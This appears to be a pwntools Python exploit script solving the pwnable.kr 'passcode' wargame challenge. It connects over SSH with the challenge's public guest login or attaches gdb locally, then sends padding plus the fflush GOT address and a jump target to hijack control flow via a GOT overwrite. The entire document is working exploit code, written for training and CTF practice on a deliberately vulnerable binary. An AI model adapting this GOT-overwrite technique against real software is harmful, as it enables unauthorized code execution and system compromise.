from pwn import * 

elf = ELF('./passcode')


if args['REMOTE']:      
    sh = ssh('passcode', 'pwnable.kr', password='guest', port=2222)
    p = sh.process('./passcode')

else: 
    context.log_level = 'DEBUG'
    p = process([elf.path])
    gdb.attach(p, 'b main')
    pause()      
    
print(p32(elf.got['fflush']))
p.sendline((b'a' * 96) + p32(0x804a004))
p.recvuntil('!')
p.sendline(str(int(0x080485de)))
 






p.interactive()